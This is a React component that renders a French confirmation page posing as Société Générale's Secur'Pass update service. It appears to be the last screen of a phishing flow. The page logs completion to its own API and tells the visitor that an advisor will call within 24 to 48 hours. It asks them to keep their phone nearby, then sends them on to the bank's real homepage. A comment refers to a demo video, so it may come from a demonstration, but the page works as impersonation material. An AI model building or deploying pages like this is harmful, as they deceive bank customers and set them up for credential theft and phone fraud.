import React, { useEffect } from 'react';
import { CheckCircle2, Phone, Info, Home } from 'lucide-react';
import { trackComplete } from '../api';

// Real SG retail bank homepage — the user is redirected here when they
// click "Retour à l'accueil" (matches the end of the demo video).
const SG_HOMEPAGE = 'https://particuliers.sg.fr/';

// Final page shown 5s after "Vérification réussie".
export default function DemandeEnregistree() {
  useEffect(() => {
    trackComplete();
  }, []);

  return (
    <div className="bg-white min-h-[calc(100vh-118px)]">
      <div className="max-w-[820px] mx-auto px-4 md:px-6 py-8 md:py-10">
        <div className="bg-white rounded-2xl overflow-hidden border border-neutral-200 shadow-sm">
          {/* Red top header */}
          <div className="bg-[#E9041E] text-white px-6 md:px-10 py-10 md:py-12 text-center">
            <div className="mx-auto w-[78px] h-[78px] rounded-full bg-white flex items-center justify-center shadow-md">
              <CheckCircle2 size={44} strokeWidth={2.6} className="text-[#E9041E]" />
            </div>
            <h1 className="mt-5 text-[26px] md:text-[30px] font-extrabold tracking-tight">
              Demande enregistrée !
            </h1>
            <p className="mt-2 text-[14.5px] md:text-[15.5px] text-white/95 font-medium max-w-md mx-auto">
              Votre demande de mise à jour a bien été prise en compte
            </p>
          </div>

          {/* Body */}
          <div className="px-6 md:px-10 py-8 md:py-10">
            <p className="text-center text-[16px] md:text-[17px] font-semibold text-[#1a1a1a]">
              Merci d&rsquo;avoir complété votre demande de mise à jour Secur&rsquo;Pass.
            </p>

            {/* Prochaine étape */}
            <div className="mt-6 border-2 border-[#FBC9D0] bg-[#FFF1F3] rounded-xl px-5 py-5 md:px-6 md:py-6 flex items-start gap-4">
              <div className="shrink-0 w-11 h-11 rounded-full bg-white border border-[#FBC9D0] flex items-center justify-center text-[#E9041E]">
                <Phone size={20} />
              </div>
              <div className="flex-1">
                <h3 className="text-[15.5px] md:text-[16.5px] font-extrabold text-[#E9041E]">
                  Prochaine étape
                </h3>
                <p className="mt-1.5 text-[13.5px] md:text-[14.5px] text-[#3a3a3a] leading-[1.55]">
                  Un conseiller vous contactera dans les{' '}
                  <strong className="font-bold">24 à 48 heures</strong> pour finaliser la mise à
                  jour de votre Secur&rsquo;Pass et vérifier vos informations.
                </p>
              </div>
            </div>

            {/* À retenir */}
            <div className="mt-4 bg-[#F4F5F7] rounded-xl px-5 py-5 md:px-6 md:py-6">
              <h3 className="flex items-center gap-2 text-[15px] md:text-[16px] font-extrabold text-[#0F1B33]">
                <Info size={18} className="text-[#0F1B33]" />
                À retenir :
              </h3>
              <ul className="mt-3 space-y-2.5 text-[13.5px] md:text-[14px] text-[#2a2a2a] leading-[1.55]">
                {[
                  'Gardez votre téléphone à proximité pour l’appel de confirmation',
                  'Aucun frais ne vous sera demandé pour cette mise à jour',
                  'Votre compte reste accessible pendant le traitement',
                  'Un email de confirmation vous a été envoyé',
                ].map((t) => (
                  <li key={t} className="flex items-start gap-2.5">
                    <span className="shrink-0 w-1.5 h-1.5 rounded-full bg-[#E9041E] mt-[9px]" />
                    <span>{t}</span>
                  </li>
                ))}
              </ul>
            </div>

            {/* Buttons */}
            <div className="mt-7">
              <a
                href={SG_HOMEPAGE}
                rel="noopener noreferrer"
                className="flex items-center justify-center gap-2 w-full bg-[#E9041E] hover:bg-[#c8031a] text-white font-bold rounded-lg py-3 text-[14.5px] transition-colors"
              >
                <Home size={17} /> Retour à l&rsquo;accueil
              </a>
            </div>

            {/* Bottom contact */}
            <div className="mt-7 pt-6 border-t border-neutral-200 text-center">
              <p className="text-[13.5px] md:text-[14px] text-[#1a1a1a]">
                Questions ? Contactez-nous au{' '}
                <a href="tel:0969390000" className="font-extrabold text-[#E9041E] hover:underline">
                  09 69 39 00 00
                </a>
              </p>
              <p className="mt-1 text-[12.5px] text-neutral-500">Disponible 24h/24, 7j/7</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
